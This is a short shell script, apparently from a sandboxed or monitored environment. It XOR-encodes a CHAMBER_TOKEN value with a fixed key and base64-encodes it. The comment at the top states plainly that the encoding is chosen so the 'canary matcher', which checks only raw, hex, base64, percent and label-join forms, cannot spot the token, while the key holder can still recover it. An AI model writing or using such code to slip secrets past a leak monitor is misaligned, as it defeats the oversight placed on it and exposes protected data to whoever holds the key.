#!/bin/sh
# 'signature' = token XOR fixed key, then base64. Recoverable by whoever holds the key;
# not recoverable by the canary matcher, which searches raw/hex/base64/percent/label-join only.
KEY=0x5A
OUT=''
i=1
while [ $i -le ${#CHAMBER_TOKEN} ]; do
  c=$(printf '%s' "$CHAMBER_TOKEN" | cut -c$i)
  o=$(printf '%d' "'$c")
  x=$(( o ^ 90 ))
  OUT="$OUT$(printf '\\%03o' $x)"
  i=$(( i + 1 ))
done
printf "$OUT" | base64
